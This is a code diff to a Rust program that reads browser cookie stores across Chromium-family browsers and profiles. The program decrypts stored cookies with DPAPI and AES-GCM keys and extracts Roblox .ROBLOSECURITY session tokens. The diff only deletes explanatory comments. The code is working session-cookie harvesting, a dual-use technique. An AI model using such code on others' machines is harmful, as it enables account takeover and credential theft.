@@ -46,7 +46,6 @@ fn roblosecurity_regex() -> &'static Regex {
 
 #[must_use]
 pub fn extract_roblox_cookie(raw_value: &str) -> Option<String> {
-    // Extract the ROBLOSECURITY token using regex as a reliable parsing method.
     roblosecurity_regex().find(raw_value).map(|m| m.as_str().to_string())
 }
 
@@ -79,7 +78,7 @@ fn browser_cookie_file_candidates() -> Vec<PathBuf> {
             app_support.join("BraveSoftware").join("Brave-Browser"),
             app_support.join("com.operasoftware.Opera"),
         ];
-        // Check standard profile names.
+
         let profiles = ["Default", "Profile 1", "Profile 2", "Profile 3"];
 
         for root in chromium_roots {
@@ -170,7 +169,6 @@ fn chromium_cookie_candidates() -> Vec<ChromiumCookieCandidate> {
         roaming.join("Opera Software").join("Opera Next"),
     ];
 
-    // Check all numbered profile directories, not just the first few
     let profile_names: Vec<String> = {
         let mut v = vec!["Default".to_string()];
         for i in 1..=20 {
@@ -186,10 +184,8 @@ fn chromium_cookie_candidates() -> Vec<ChromiumCookieCandidate> {
             continue;
         }
 
-        // Always include the root itself (Opera places cookies directly there)
         let mut profile_dirs = vec![root.clone()];
 
-        // Also enumerate all subdirectories to catch any profile name
         if let Ok(entries) = std::fs::read_dir(root) {
             for entry in entries.flatten() {
                 let path = entry.path();
@@ -220,7 +216,6 @@ fn chromium_cookie_candidates() -> Vec<ChromiumCookieCandidate> {
 
 #[cfg(target_os = "windows")]
 fn decrypt_dpapi(data: &[u8]) -> crate::error::Result<Vec<u8>> {
-    // Request DPAPI decryption from Windows.
     unsafe {
         let in_blob =
             CRYPT_INTEGER_BLOB { cbData: data.len() as u32, pbData: data.as_ptr().cast_mut() };
@@ -302,13 +297,10 @@ fn decrypt_chromium_cookie(encrypted_value: &[u8], master_key: &[u8]) -> Option<
         return None;
     }
 
-    // v20 = Chrome 127+ app-bound encryption, requires Chrome's elevation service
-    // we cannot decrypt these without running inside Chrome - skip gracefully
     if encrypted_value.starts_with(b"v20") {
         return None;
     }
 
-    // v10/v11 = AES-256-GCM with DPAPI-protected master key (standard Chromium)
     if encrypted_value.starts_with(b"v10") || encrypted_value.starts_with(b"v11") {
         if encrypted_value.len() <= 15 {
             return None;
@@ -321,7 +313,6 @@ fn decrypt_chromium_cookie(encrypted_value: &[u8], master_key: &[u8]) -> Option<
             .and_then(|p| String::from_utf8(p).ok());
     }
 
-    // legacy DPAPI fallback for very old Chromium builds
     decrypt_dpapi(encrypted_value).ok().and_then(|bytes| String::from_utf8(bytes).ok())
 }
 
@@ -367,8 +358,6 @@ fn private_temp_dir() -> Option<PathBuf> {
     None
 }
 
-// Copy the DB plus WAL/SHM sidecars into a private random directory so SQLite can
-// read in-flight browser cookies without competing with the browser's live handles.
 fn copy_cookie_db(path: &Path) -> Option<TempDb> {
     let dir = private_temp_dir()?;
     let temp_db = dir.join("Cookies.sqlite");
